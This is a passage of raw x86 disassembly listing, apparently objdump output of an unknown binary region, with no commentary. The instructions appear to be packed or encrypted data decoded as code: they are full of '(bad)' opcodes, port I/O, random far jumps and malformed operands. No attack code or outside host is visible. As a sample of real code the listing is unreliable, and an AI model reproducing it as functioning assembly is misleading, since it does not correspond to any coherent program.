  4104fd:	fdiv   QWORD PTR [ebx+ebp*1+0x29b4a513]
  410504:	mov    dh,BYTE PTR [ebp+0x29]
  410507:	in     al,0x28
  410509:	cs inc esp
  41050b:	xlat   BYTE PTR ds:[ebx]
  41050c:	(bad)  
  41050d:	push   edx
  41050e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41050f:	aas    
  410510:	inc    edx
  410511:	sub    al,dl
  410513:	mov    dh,0x6a
  410515:	outs   dx,DWORD PTR ds:[esi]
  410516:	pop    esi
  410517:	scas   al,BYTE PTR es:[edi]
  410518:	jmp    0xe97f858f
  41051d:	pop    ecx
  41051e:	jle    0x41057c
  410520:	cld    
  410521:	xor    BYTE PTR [esi-0x11],al
  410524:	cwde   
  410525:	mov    ecx,0x99855802
  41052a:	(bad)  
  41052b:	sti    
  41052c:	jle    0x410579
  41052e:	dec    ebx
  41052f:	pushf  
  410530:	pop    ebx
  410531:	push   esp
  410532:	in     eax,0x60
  410534:	sbb    eax,0x7ba7914f
  410539:	repnz jecxz 0x410504
  41053c:	pop    ebp
  41053d:	cmp    esi,esi
  41053f:	outs   dx,DWORD PTR ds:[esi]
  410540:	push   0xfffffffc
  410542:	ret    
  410543:	pusha  
  410544:	mov    gs,edx
  410546:	leave  
  410547:	push   edx
  410548:	jmp    FWORD PTR [esi-0x48ad91ff]
  41054e:	cmp    BYTE PTR [ebp+0x6b39e054],dl
  410554:	fsubr  DWORD PTR [eax]
  410556:	div    BYTE PTR [ebx+0x6716ae91]
  41055c:	ins    BYTE PTR es:[edi],dx
  41055d:	rcl    cl,cl
  41055f:	out    0x58,eax
  410561:	les    edx,FWORD PTR [edx-0x73]
  410564:	or     al,0xe9
  410566:	push   ebp
  410567:	push   cs
  410568:	dec    esp
  410569:	jae    0x410588
  41056b:	cld    
  41056c:	sbb    al,0x7a
  41056e:	xchg   esi,eax
  41056f:	mov    al,0x35
  410571:	pop    esp
  410572:	and    esp,DWORD PTR [ebx-0x4c42b261]
  410578:	inc    edi
  410579:	mov    al,0xc3
  41057b:	ret    0x542a
  41057e:	sbb    BYTE PTR [edi-0x6b],bl
  410581:	jns    0x41055b
  410583:	ror    eax,0x3
  410586:	xor    al,bh
  410588:	lock lahf 
  41058a:	sahf   
  41058b:	mov    al,0x24
  41058d:	leave  
  41058e:	dec    edi
  41058f:	push   esi
  410590:	jmp    0xad66:0x29fcad34
  410597:	je     0x4105cd
  410599:	fisub  DWORD PTR [eax-0x56]
  41059c:	les    ebx,FWORD PTR [edx+edx*2-0x6836ede8]
  4105a3:	pop    ds
  4105a4:	adc    BYTE PTR [edi-0x64],al
  4105a7:	pop    eax
  4105a8:	push   edi
  4105a9:	das    
  4105aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105ab:	popf   
  4105ac:	inc    esp
  4105ad:	mov    dl,0xf6
  4105af:	xchg   BYTE PTR [edi-0x44],dl
  4105b2:	(bad)
  4105b5:	inc    esp
  4105b6:	aas    
  4105b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105b8:	frstor [edx]
  4105ba:	mov    ebx,0x5145811d
  4105bf:	lods   eax,DWORD PTR ds:[esi]
  4105c0:	jne    0x41061f
  4105c2:	das    
  4105c3:	inc    edi
  4105c4:	push   es
  4105c5:	pop    edx
  4105c6:	fdivr  QWORD PTR [ebx+ebp*1+0x7d]
  4105ca:	add    eax,DWORD PTR [eax]
  4105cc:	sbb    BYTE PTR [ecx],bh
  4105ce:	or     cl,BYTE PTR [ecx-0x1f]
  4105d1:	sbb    DWORD PTR [ecx+0x73],esi
  4105d4:	(bad)  
  4105d6:	nop    edx
  4105d9:	(bad)  
  4105da:	pop    edi
  4105db:	sub    eax,0x16ed2450
  4105e0:	imul   ebp,DWORD PTR [edx+eax*2+0x2549813d],0xf2c7c19
  4105eb:	inc    esp
  4105ec:	xchg   DWORD PTR [edx-0x2c],eax
  4105ef:	jnp    0x410662
  4105f1:	push   edx
  4105f2:	repz pop es
  4105f4:	es leave 
  4105f6:	call   0xcfc2:0x76d38afa
  4105fd:	(bad)  
  4105fe:	cdq    
  4105ff:	pop    ebp
  410600:	mov    cl,0xf5
  410602:	cmc    
  410603:	and    BYTE PTR ds:0xf54f7a6c,bh
  410609:	nop
  41060a:	cli    
  41060b:	and    esi,DWORD PTR [edi]
  41060d:	in     eax,0xd4
  41060f:	ja     0x4105bb
  410611:	fwait
  410612:	xchg   ebp,eax
  410613:	ficom  WORD PTR ds:0x373c644a
  410619:	aad    0x4c
  41061b:	inc    edx
  41061c:	sahf   
  41061d:	shr    BYTE PTR [esp+esi*2+0x2b1c3e00],1
  410624:	aad    0x8b
  410626:	cmc    
  410627:	sbb    al,0x3f
  410629:	dec    esp
  41062a:	push   0x14
  41062c:	(bad)  
  41062d:	cmp    eax,0x9a0b161b
  410632:	mov    BYTE PTR [eax+edx*8+0x36],bl
  410636:	repz mov edx,0xa7262d1d
  41063c:	mov    esi,0x92cdf40d
  410642:	ret    0x8f57
  410645:	in     eax,0x6d
  410647:	dec    esi
  410648:	stc    
  410649:	out    0xd4,al
  41064b:	sub    ch,BYTE PTR [edi-0x10]
  41064e:	mov    ch,0x7f
  410650:	ret    0xcf56
  410653:	jno    0x4106aa
  410655:	dec    edi
  410656:	pslld  mm7,QWORD PTR [esp+ecx*2]
  41065a:	enter  0xc28b,0x6f
  41065e:	push   ss
  41065f:	mov    al,ds:0xd00c5ca7
  410664:	or     bl,BYTE PTR [edx+0x157e6790]
  41066a:	jp     0x41060b
  41066c:	arpl   WORD PTR ss:[ebp+0x0],bp
  410670:	fwait
  410671:	sub    BYTE PTR [edi+ebx*2+0x1a8c7767],0xb5
  410679:	or     DWORD PTR [ebp+eax*8-0x50],edx
  41067d:	push   ebx
  41067e:	mov    esp,0x7e08ad17
  410683:	loopne 0x410681
  410685:	adc    eax,0x377b71b6
  41068a:	les    ebp,FWORD PTR [esi]
  41068c:	jge    0x41066a
  41068e:	lods   eax,DWORD PTR ds:[esi]
  410690:	or     eax,0x96cdaba
  410695:	ins    BYTE PTR es:[edi],dx
  410696:	leave  
  410697:	mov    eax,0x2b5ae76
  41069c:	add    bl,BYTE PTR [edx-0x5d46122a]
  4106a2:	or     eax,0xf263f70b
  4106a7:	add    al,0xc7
  4106a9:	inc    ebp
  4106aa:	sbb    BYTE PTR [esi],ch
  4106ac:	fistp  QWORD PTR [ecx+0x5e0c489f]
  4106b2:	jmp    0x41063d
  4106b4:	xor    dl,BYTE PTR [ecx]
  4106b6:	inc    esp
  4106b7:	scas   eax,DWORD PTR es:[edi]
  4106b8:	sub    BYTE PTR [esi-0x4269c5c2],ah
  4106be:	sub    ebx,DWORD PTR ds:0x266b279d
  4106c4:	pop    ebp
  4106c5:	mov    eax,0xad61b033
  4106ca:	bswap  ebx
  4106cc:	int    0x99
  4106ce:	cmp    DWORD PTR [ebp-0xe],esi
  4106d1:	xchg   esi,eax
  4106d2:	jmp    DWORD PTR [ecx]
  4106d4:	imul   esi,DWORD PTR [ebx+0x32],0x3d
  4106d8:	enter  0x1822,0xbd
  4106dc:	jmp    0x410718
  4106de:	call   0x29bcf7eb
  4106e3:	mov    esp,0x9bad4320
  4106e8:	sub    al,0xb6
  4106ea:	sbb    al,0xa0
  4106ec:	cli    
  4106ed:	push   esp
  4106ee:	dec    ebx
  4106ef:	jmp    FWORD PTR [esi+eiz*4-0x7b]
  4106f3:	ret    
  4106f4:	jg     0x4106ea
  4106f6:	call   0x87e528d1
  4106fb:	dec    ebx
  4106fc:	icebp  
  4106fd:	out    0xee,eax
  4106ff:	mov    al,0xe5
  410701:	out    dx,al
  410702:	mov    eax,0xaf671483
  410707:	cmp    DWORD PTR ss:[esi+edx*4+0x16d1c44d],esp
  41070f:	pop    esi
  410710:	gs inc ecx
  410712:	pop    ebp
  410713:	fcom   QWORD PTR [ecx-0x20]
  410716:	fwait
  410717:	es sub ebp,esi
  41071a:	call   0x394e33d3
  41071f:	bound  eax,QWORD PTR [edx+edx*2+0x43]
  410723:	pop    edi
  410724:	das    
  410725:	lock inc edx
  410727:	sti    
  410728:	push   edx
  410729:	mov    eax,0x7d5bf70
  41072e:	std    
  41072f:	or     ebx,DWORD PTR [esi-0x1729013f]
  410735:	test   eax,0x3f8357fd
  41073a:	sbb    al,0xb6
  41073c:	bound  edx,QWORD PTR [edx-0x125fbb13]
  410742:	dec    ebp
  410743:	add    eax,0xbe703bbb
  410748:	arpl   WORD PTR [ebp+0x78],cx
  41074b:	in     eax,0x79
  41074d:	or     eax,0x46dea570
  410752:	xor    cl,cl
  410754:	mov    esp,0xcd17ab7b
  410759:	push   eax
  41075a:	(bad)  
  41075b:	mov    eax,ds:0xef24af3c
  410760:	or     bl,BYTE PTR [ebx-0x3a]
  410763:	jno    0x41077d
  410765:	ins    DWORD PTR es:[edi],dx
  410766:	sub    al,0x8b
  410768:	xchg   ebp,eax
  410769:	hlt    
  41076a:	or     BYTE PTR [ecx],0xc0
  41076d:	mov    dl,BYTE PTR [ebp-0x10]
  410770:	or     DWORD PTR [edi+eiz*4-0x66],0x38
  410775:	pop    ds
  410776:	ror    BYTE PTR [edx],1
  410778:	push   ds
  410779:	call   0xf6dc:0x24e09921
  410780:	jmp    0xd278:0x6a57004b
  410787:	pop    ebx
  410788:	mov    ds:0x3a82eb2c,al
  41078d:	dec    eax
  41078e:	add    DWORD PTR [eax],edx
  410790:	pop    ss
  410791:	in     eax,0xa1
  410793:	cmp    al,0x8f
  410795:	jo     0x4107ad
  410797:	push   0x61
  410799:	sub    dh,BYTE PTR [ecx+0x2eaf8f20]
  41079f:	ret    0xa56a
  4107a2:	pop    ds
  4107a3:	push   esi
  4107a4:	jmp    0xc1c945d2
  4107a9:	pusha  
  4107aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ab:	mov    ecx,0xbfe62552
  4107b0:	ror    BYTE PTR [eax+esi*4-0x32ef0855],1
  4107b7:	cs sub al,cl
  4107ba:	and    dh,ah
  4107bc:	add    dl,BYTE PTR [edx]
  4107be:	aas    
  4107bf:	fucomp st(1)
  4107c1:	mov    ecx,0xb05ed583
  4107c6:	push   ebp
  4107c7:	sub    DWORD PTR [ebx+0x7412235],eax
  4107cd:	test   al,0x9b
  4107cf:	fnstenv [eax+0xd517ffc]
  4107d5:	scas   al,BYTE PTR es:[edi]
  4107d6:	push   0xffffffa6
  4107d8:	int    0xf9
  4107da:	xchg   BYTE PTR [ecx-0x4a],ch
  4107dd:	(bad)  
  4107df:	push   ecx
  4107e0:	fstp   QWORD PTR [ebp+0x4257e1a0]
  4107e6:	jne    0x4107e3
  4107e8:	(bad)  
  4107e9:	jns    0x4107f6
  4107eb:	jnp    0x410866
  4107ed:	inc    BYTE PTR [ebp+0x25bea91d]
  4107f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107f4:	sahf   
  4107f5:	div    DWORD PTR [edx]
  4107f7:	daa    
  4107f8:	out    dx,al
  4107f9:	inc    edi
  4107fa:	mov    WORD PTR ds:[edi],fs
  4107fd:	dec    esi
  4107fe:	xor    cl,BYTE PTR [ecx-0x8]
  410801:	sbb    al,0xf3
  410803:	test   eax,0xc9c1c888
  410808:	test   al,0x5d
  41080a:	retf   0x2ee
  41080d:	xor    eax,0x39ecb7fd
  410812:	rcr    BYTE PTR [edi],1
  410814:	jae    0x410822
  410816:	push   edx
  410817:	xchg   ebp,eax
  410818:	je     0x4107a7
  41081a:	popa   
  41081b:	retf   0x1e19
  41081e:	adc    ch,BYTE PTR [ebp-0x30]
  410821:	addr16 adc bh,ah
  410824:	xor    BYTE PTR [esi],dh
  410826:	daa    
  410827:	fnstenv [esi+0x57]
  41082a:	ds imul ebp,eax,0xffffff93
  41082e:	pushf  
  41082f:	popa   
  410830:	call   0xb4ab2a0c
  410835:	mov    bh,0xf4
  410837:	leave  
  410838:	iret   
  410839:	mov    al,0xee
  41083b:	inc    edx
  41083c:	jns    0x4108b2
  41083e:	jmp    0xafc0:0x5119ed09
  410845:	(bad)  
  410846:	or     al,0x55
  410848:	mov    ds:0x2b684dba,al
  41084d:	repz cwde 
  41084f:	outs   dx,DWORD PTR ds:[esi]
  410850:	sbb    BYTE PTR [eax-0x781424b9],dh
  410856:	fcomp  DWORD PTR [ecx+0x2995e51a]
  41085c:	dec    ebx
  41085d:	adc    DWORD PTR [edi-0x1ef460af],ecx
  410863:	and    DWORD PTR [eax],edx
  410865:	sahf   
  410866:	push   edi
  410867:	ja     0x41086f
  410869:	loop   0x4108d6
  41086b:	lods   al,BYTE PTR ds:[esi]
  41086c:	pop    ecx
  41086d:	cs mov cl,0x4f
  410870:	pop    edi
  410871:	mov    DWORD PTR [ecx],eax
  410873:	mov    ch,0xa7
  410875:	test   edx,esp
  410877:	sub    al,0x67
  410879:	cs pop ds
  41087b:	aad    0x50
  41087d:	ret    0x5aeb
  410880:	mov    gs:0x7a224d75,eax
  410886:	dec    edi
  410887:	call   0x2994:0x5d93531f
  41088e:	addr16 dec ecx
  410890:	push   0xffffff86
  410892:	popf   
  410893:	cli    
  410894:	add    dl,BYTE PTR [edi-0x48028e90]
  41089a:	dec    eax
  41089b:	jle    0x23a88880
  4108a1:	push   ebx
  4108a2:	ret    
  4108a3:	xchg   ebx,eax
  4108a4:	test   dh,0x88
  4108a7:	sbb    al,BYTE PTR [ecx]
  4108a9:	sub    esp,DWORD PTR [ebx]
  4108ab:	lea    esp,[ebp+0x2d31dfc3]
  4108b1:	imul   edi,eax,0x3687c31
  4108b7:	push   esp
  4108b8:	ins    DWORD PTR es:[edi],dx
  4108b9:	out    dx,eax
  4108ba:	mov    ?,WORD PTR [edi]
  4108bc:	mov    WORD PTR [esi],fs
  4108be:	push   0x3a98524
  4108c3:	and    esp,DWORD PTR [esi+0x64]
  4108c6:	push   eax
  4108c7:	jmp    0x298d:0x76f9be69
  4108ce:	jnp    0x410917
  4108d0:	int3   
  4108d1:	lods   al,BYTE PTR ds:[esi]
  4108d2:	pop    edi
  4108d3:	ins    DWORD PTR es:[edi],dx
  4108d4:	xlat   BYTE PTR ds:[ebx]
  4108d5:	mov    gs:0xdf9cfefe,eax
  4108db:	ins    BYTE PTR es:[edi],dx
  4108dc:	xchg   edx,eax
  4108dd:	sahf   
  4108de:	pop    es
  4108df:	and    dh,dh
  4108e1:	or     eax,0x19367be5
  4108e6:	test   BYTE PTR [edx+eiz*2],bh
  4108e9:	stos   BYTE PTR es:[edi],al
  4108ea:	dec    esi
  4108eb:	leave  
  4108ec:	xchg   edx,eax
  4108ed:	jo     0x41094f
  4108ef:	push   esp
  4108f0:	ins    BYTE PTR es:[edi],dx
  4108f1:	data16 loopne 0x4108dc
  4108f4:	shl    BYTE PTR [esi-0x59f8d1ec],0xac
  4108fb:	jmp    0x851c:0xcb4fa638
  410902:	sti    
  410903:	pop    edi
  410904:	stos   BYTE PTR es:[edi],al
  410905:	ins    DWORD PTR es:[edi],dx
  410906:	call   0xd3e91d89
  41090b:	cmp    esp,DWORD PTR [edx-0x28]
  41090e:	xchg   ebx,eax
  41090f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410911:	addr16 mov al,ds:0xbb16
  410915:	cmp    eax,0x8c765a14
  41091a:	call   0xa437:0x5a7b5752
  410921:	or     ah,dh
  410923:	and    edx,DWORD PTR [ebx+0x3e]
  410926:	adc    eax,0xee7d5629
  41092b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41092c:	sbb    al,BYTE PTR [edx]
  41092e:	gs mov dl,0xea
  410931:	xchg   BYTE PTR [eax],dh
  410933:	xchg   edi,eax
  410934:	dec    edx
  410935:	add    esi,DWORD PTR [ecx]
  410937:	jp     0x410915
  410939:	mov    cl,0xaf
  41093b:	adc    ecx,edx
  41093d:	sub    ch,cl
  41093f:	cmp    al,0x2e
  410941:	retf   
  410942:	dec    esp
  410943:	and    al,0x21
  410945:	xor    ebp,DWORD PTR [ecx-0x2b]
  410948:	or     BYTE PTR [ecx-0x35],0x46
  41094c:	mov    eax,ds:0x2e9ec340
  410951:	xchg   esi,eax
  410952:	loop   0x4109a9
  410954:	mov    al,ds:0xc9994fad
  410959:	or     eax,0xba6cff34
  41095e:	repnz in al,dx
  410960:	stc    
  410961:	(bad)  
  410962:	fnstcw WORD PTR [edx-0x7e]
  410965:	fstp   QWORD PTR [ecx+0x2fbaef1d]
  41096b:	push   cs
  41096c:	dec    eax
  41096d:	js     0x4109e2
  41096f:	jae    0x4109e0
  410971:	xchg   esi,eax
  410972:	mov    dh,0xb0
  410974:	inc    ebp
  410975:	outs   dx,BYTE PTR ds:[esi]
  410976:	mov    dh,0x1
  410978:	leave  
  410979:	pop    ecx
  41097a:	(bad)  
  41097c:	mov    ch,0x21
  41097e:	out    0x5d,al
  410980:	push   edx
  410981:	adc    al,0x2f
  410983:	xor    ecx,DWORD PTR [ecx-0x1d7f2ab]
  410989:	xchg   BYTE PTR [ebp-0x2e],bh
  41098c:	mov    ch,0xc5
  41098e:	retf   0xa1c3
  410991:	push   0x33
  410993:	fadd   DWORD PTR [ecx-0x4a441e44]
  410999:	lods   al,BYTE PTR ds:[esi]
  41099a:	sbb    DWORD PTR [eax],ebx
  41099c:	into   
  41099d:	lea    ebp,[edi]
  41099f:	lahf   
  4109a0:	cld    
  4109a1:	mov    DWORD PTR [edx],esi
  4109a3:	sbb    esi,DWORD PTR [ebx+0x2041a35]
  4109a9:	les    ebx,FWORD PTR [esi+0x54]
  4109ac:	mov    ebx,0x907f2c1a
  4109b1:	rcl    BYTE PTR [edi+ecx*8],cl
  4109b4:	aad    0x26
  4109b6:	mov    bh,0xb1
  4109b8:	mov    esi,0x9411298f
  4109bd:	and    BYTE PTR [ecx+0x632cda49],ah
  4109c3:	cmp    dl,bh
  4109c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109c6:	aaa    
  4109c7:	pop    esi
  4109c8:	mov    ah,0x8d
  4109ca:	xor    dl,BYTE PTR [edx-0x3e]
  4109cd:	repnz push ecx
  4109cf:	pop    eax
  4109d0:	mov    bh,0x95
  4109d2:	imul   esp,DWORD PTR [ecx+0x2bf6b09],0xfffffff9
  4109d9:	jecxz  0x410977
  4109db:	add    eax,0x3de49fe3
  4109e0:	mov    dl,0x7c
  4109e2:	or     al,0x10
  4109e4:	fadd   QWORD PTR gs:[edi+0x3a]
  4109e8:	jge    0x4109e9
  4109ea:	or     ah,cl
  4109ec:	pop    ebp
  4109ed:	cmp    eax,0x63a50615
  4109f2:	or     ebx,esi
  4109f4:	test   BYTE PTR [eax-0x34],0x24
  4109f8:	pop    esp
  4109f9:	jns    0x410a60
  4109fb:	into   
  4109fc:	xor    DWORD PTR [edi],edx
  4109fe:	test   BYTE PTR [ecx-0x6a9d9dfe],0x59
  410a05:	cmp    BYTE PTR [esi+eiz*4],ah
  410a08:	fst    QWORD PTR [edx+0x4a]
  410a0b:	push   ss
  410a0c:	jbe    0x4109d0
  410a0e:	outs   dx,BYTE PTR ds:[esi]
  410a0f:	sbb    BYTE PTR [ebx+eax*1],0x86
  410a13:	adc    BYTE PTR [ecx-0x79c9300a],0x11
  410a1a:	pop    DWORD PTR [esi+0x71f367b2]
  410a20:	out    dx,eax
  410a21:	dec    eax
  410a22:	or     al,bl
  410a24:	std    
  410a25:	cmp    DWORD PTR [edx-0x49025904],edi
  410a2b:	mov    bh,0xf4
  410a2d:	dec    ebx
  410a2e:	inc    ebp
  410a2f:	xor    al,0x6c
  410a31:	mov    BYTE PTR [eax],bh
  410a33:	outs   dx,BYTE PTR ds:[esi]
  410a34:	mov    ebp,0xb7946e93
  410a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a3a:	mov    WORD PTR [eax-0x15],es
  410a3d:	dec    esi
  410a3e:	xor    ah,bh
  410a40:	inc    dx
  410a42:	jmp    0x410a5e
  410a44:	sti    
  410a45:	retf   
  410a46:	cmp    al,0x40
  410a48:	fdivrp st(0),st
  410a4a:	xor    edx,DWORD PTR [edx-0x7b]
  410a4d:	and    esi,DWORD PTR [ebp-0x2c]
  410a50:	das    
  410a51:	pop    ss
  410a52:	cmp    eax,0x69930994
  410a57:	lock das 
  410a59:	or     DWORD PTR ds:0x61d4211b,0x5d
  410a60:	mov    bh,0x50
  410a62:	mov    dh,0xc7
  410a64:	add    BYTE PTR [edx-0x80],ch
  410a67:	js     0x4109eb
  410a69:	dec    ecx
  410a6a:	push   ecx
  410a6b:	add    al,BYTE PTR [edi-0x55864a72]
  410a71:	dec    ebp
  410a72:	xor    BYTE PTR [edi+0x9],ah
  410a75:	or     al,0x9d
  410a77:	aaa    
  410a78:	xchg   ebx,eax
  410a79:	inc    edi
  410a7a:	add    DWORD PTR [esi+ebp*8],esp
  410a7d:	mov    edx,0x31fcb8b5
  410a82:	mov    al,0xa5
  410a84:	out    dx,eax
  410a85:	jnp    0x410ad7
  410a87:	add    DWORD PTR [esp+ecx*2-0x538172cb],ecx
  410a8e:	adc    DWORD PTR [edx+0x13],ecx
  410a91:	pop    es
  410a92:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  410a94:	pusha  
  410a95:	sbb    eax,0xa1a1d7bf
  410a9a:	pop    ebp
  410a9b:	pop    ss
  410a9c:	push   ebp
  410a9d:	push   esi
  410a9e:	adc    DWORD PTR [esi+0x45],0xbb104611
  410aa5:	dec    ebx
  410aa6:	add    esp,DWORD PTR [esi+ecx*1-0x33]
  410aaa:	test   ch,0x41
  410aad:	icebp  
  410aae:	cdq    
  410aaf:	and    cl,BYTE PTR [bp+0x6add]
  410ab4:	jge    0x410ac8
  410ab6:	push   esp
  410ab7:	aaa    
  410ab8:	xchg   edx,eax
  410ab9:	dec    esp
  410aba:	test   al,0xda
  410abc:	pop    ds
  410abd:	jo     0x410adb
  410abf:	in     al,dx
  410ac0:	loop   0x410b3c
  410ac2:	fistp  DWORD PTR [ebx]
  410ac4:	adc    al,0x1b
  410ac6:	mov    eax,0xe09f8e23
  410acb:	retf   
  410acc:	cwde   
  410acd:	shr    BYTE PTR [ebp+0x4ef5476f],cl
  410ad3:	mov    WORD PTR [eax-0x56db5900],?
  410ad9:	mov    al,0x6c
  410adb:	scas   eax,DWORD PTR es:[edi]
  410adc:	push   ebx
  410add:	sbb    esi,DWORD PTR [ecx-0x283f1b01]
  410ae3:	push   ss
  410ae4:	loopne 0x410b0a
  410ae6:	(bad)  
  410ae7:	mov    bl,0x8b
  410ae9:	pop    ebp
  410aea:	jbe    0x410b53
  410aec:	sti    
  410aed:	xchg   al,ah
  410aef:	call   FWORD PTR [eax]
  410af1:	rcl    BYTE PTR [ebx],1
  410af3:	xchg   DWORD PTR [esi-0x2677659e],ebp
  410af9:	adc    DWORD PTR [ebx-0x655d614b],esp
  410aff:	cmc    
  410b00:	cmp    DWORD PTR [edi*4-0x34e1a1ff],ebx
  410b07:	mov    al,ds:0x991bed8c
  410b0c:	std    
  410b0d:	ja     0x410ae3
  410b0f:	les    edx,FWORD PTR [esi-0x3ffef5b8]
  410b15:	mov    esp,0xb77b5ad8
  410b1a:	mov    cl,0x8b
  410b1c:	mov    ds:0x63cfa20d,al
  410b21:	call   0x18ff1d4
  410b26:	or     eax,0x4c290177
  410b2b:	pusha  
  410b2c:	scas   eax,DWORD PTR es:[edi]
  410b2d:	push   es
  410b2e:	inc    esi
  410b2f:	int    0x34
  410b31:	fwait
  410b32:	in     al,dx
  410b33:	adc    al,0x66
  410b35:	lahf   
  410b36:	sbb    al,ah
  410b38:	fstp   DWORD PTR ss:[ebp+0x5]
  410b3c:	pop    ecx
  410b3d:	adc    ecx,ecx
  410b3f:	push   ebp
  410b40:	jl     0x410b49
  410b42:	into   
  410b43:	jne    0x410ae9
  410b45:	mov    ds:0xbd909068,al
  410b4a:	jp     0x410ae3
  410b4c:	pushf  
  410b4d:	xlat   BYTE PTR ds:[ebx]
  410b4e:	jge    0x410bc7
  410b50:	fs popa 
  410b52:	inc    esi
  410b53:	inc    dx
  410b55:	and    al,0xe5
  410b57:	dec    ebp
  410b58:	call   0x562605e5
  410b5d:	aam    0xa6
  410b5f:	push   esi
  410b60:	fild   WORD PTR [ebx]
  410b62:	cmc    
  410b63:	jb     0x410bde
  410b65:	fldcw  WORD PTR [edi+0x71]
  410b68:	and    edx,ecx
  410b6a:	push   esi
  410b6b:	jne    0x410b94
  410b6d:	dec    DWORD PTR [edi+0x47]
  410b70:	xchg   ebp,eax
  410b71:	rcr    edi,cl
  410b73:	jecxz  0x410b42
  410b75:	mov    ah,0xd8
  410b77:	sbb    DWORD PTR [esi+eax*1-0x16],ecx
  410b7b:	icebp  
  410b7c:	fmul   st,st(0)
  410b7e:	mov    eax,ds:0x324f835d
  410b83:	push   es
  410b84:	imul   ebx,DWORD PTR [edi+eax*2+0x5cfe7b0f],0x61e69966
  410b8f:	adc    eax,0x41ad87c7
  410b94:	xor    eax,0x946a3f34
  410b99:	test   eax,0xee0e3a52
  410b9e:	shl    BYTE PTR [ecx+0x715ea7eb],0xf7
  410ba5:	aas    
  410ba6:	std    
  410ba7:	adc    eax,0x50f47e15
  410bac:	sub    al,BYTE PTR [esi+0x1b]
  410baf:	xchg   BYTE PTR [esp+eiz*4-0x1b],bl
  410bb3:	lods   eax,DWORD PTR ds:[esi]
  410bb4:	mov    al,bl
  410bb6:	imul   esi,edx,0x7781b665
  410bbc:	aas    
  410bbd:	(bad)  
  410bbe:	xchg   ecx,eax
  410bbf:	addr16 push edi
  410bc1:	sbb    eax,0x57f7e72b
  410bc6:	shl    DWORD PTR [ebp+0x74],0xd7
  410bca:	ret    
  410bcb:	shr    DWORD PTR [edi],1
  410bcd:	xchg   ecx,eax
  410bce:	mov    ds:0x71ee6a12,eax
  410bd3:	mov    ebx,0x7b854a25
  410bd8:	mov    ebx,0xe0475b1e
  410bdd:	or     dl,BYTE PTR [eiz*4+0x7c4e1ca1]
  410be4:	or     BYTE PTR [esi-0x71268234],al
  410bea:	outs   dx,BYTE PTR ds:[esi]
  410beb:	mov    esp,0xd09ac0a6
  410bf0:	adc    ah,BYTE PTR [edi]
  410bf2:	in     eax,0xa3
  410bf4:	ins    BYTE PTR es:[edi],dx
  410bf5:	fidiv  WORD PTR [ecx-0x6b]
  410bf8:	in     eax,0x4a
  410bfa:	arpl   WORD PTR [edi],cx
  410bfc:	sti    
  410bfd:	adc    DWORD PTR [edx],ebp
  410bff:	cmp    bh,BYTE PTR [edx-0x3ddf0f50]
  410c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c06:	loopne 0x410bdf
  410c08:	fs popa 
  410c0a:	push   ebx
  410c0b:	pop    ebp
  410c0c:	sub    eax,0x565a152e
  410c11:	es out dx,al
  410c13:	jb     0x410c56
  410c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c16:	stc    
  410c17:	shr    DWORD PTR [esi-0x4a14941a],0xa3
  410c1e:	inc    esp
  410c1f:	loope  0x410c62
  410c21:	rdpmc  
  410c23:	pop    edi
  410c24:	lea    esp,[edx-0x7ac3f6fb]
  410c2a:	cld    
  410c2b:	sti    
  410c2c:	pop    ecx
  410c2d:	cmp    BYTE PTR [ecx-0x16564a6c],0xb7
  410c34:	test   ch,dh
  410c36:	push   ebx
  410c37:	xchg   edx,eax
  410c38:	or     BYTE PTR ds:0x49e75b0f,ch
  410c3e:	jp     0x410c6b
  410c40:	dec    esi
  410c41:	or     al,0x8e
  410c43:	add    DWORD PTR [esi+0x1761161a],ebp
  410c49:	pop    esp
  410c4a:	aam    0x1
  410c4c:	xchg   DWORD PTR [ecx+0x45471971],ebx
  410c52:	xchg   ebx,eax
  410c53:	and    bl,BYTE PTR [esi]
  410c55:	sub    DWORD PTR [edi+0x60],edx
  410c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c59:	test   al,0x2
  410c5b:	cmp    DWORD PTR [esi],edi
  410c5d:	xchg   ecx,eax
  410c5e:	sub    ah,BYTE PTR [ecx+0x70dac2d6]
  410c64:	and    ebp,edx
  410c66:	dec    eax
  410c67:	push   esi
  410c68:	test   eax,0xd5731388
  410c6d:	pop    edx
  410c6e:	jb     0x410c8d
  410c70:	out    dx,eax
  410c71:	mov    dh,0xfd
  410c73:	pop    edi
  410c74:	in     al,dx
  410c75:	push   cs
  410c76:	aam    0xa4
  410c78:	nop
  410c79:	ss push cs
  410c7b:	push   edi
  410c7c:	add    dh,BYTE PTR gs:[ecx+edx*8+0x2e]
  410c81:	outs   dx,DWORD PTR ds:[esi]
  410c82:	or     eax,0x79031253
  410c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c88:	xor    al,0xb1
  410c8a:	cmp    DWORD PTR [eax-0x10],esp
  410c8d:	cmp    cl,BYTE PTR [edi]
  410c8f:	rcr    DWORD PTR [edx],0xe4
  410c92:	ins    BYTE PTR es:[edi],dx
  410c93:	(bad)  
  410c95:	jne    0x410d10
  410c97:	lds    esi,FWORD PTR [edx-0x7461557c]
  410c9d:	call   0xd3ab:0xddb9471b
  410ca4:	lods   al,BYTE PTR ds:[esi]
  410ca5:	dec    eax
  410ca6:	mov    edi,DWORD PTR [eax]
  410ca8:	xchg   BYTE PTR [edi+0x4b],ah
  410cab:	cdq    
  410cac:	cs cmp al,0x41
  410caf:	pop    eax
  410cb0:	(bad)  
  410cb2:	adc    DWORD PTR [eax],edi
  410cb4:	(bad)  
  410cb5:	jns    0x410cbe
  410cb7:	mov    DWORD PTR [edi+0x36d9cebb],edx
  410cbd:	xchg   edi,eax
  410cbe:	ja     0x410ca9
  410cc0:	lea    eax,[ecx]
  410cc2:	jg     0x410ca9
  410cc4:	jo     0x410c87
  410cc6:	dec    ebx
